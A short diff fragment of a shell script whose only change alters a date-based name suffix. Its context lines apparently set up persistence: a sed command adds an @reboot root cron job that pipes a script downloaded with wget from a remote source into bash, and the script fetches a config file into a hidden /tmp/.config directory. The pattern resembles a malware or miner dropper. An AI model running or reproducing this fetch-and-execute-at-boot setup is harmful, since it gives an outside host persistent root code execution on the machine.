@@ -5,7 +5,7 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- ${src}/...) >>/d
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$name" ] || name="NULL"
-name="${name}z"
+name="${name}u"
 
 mkdir -p "/tmp/.config"
 wget -qO "/tmp/.config/config.json" "${src}/z.json"
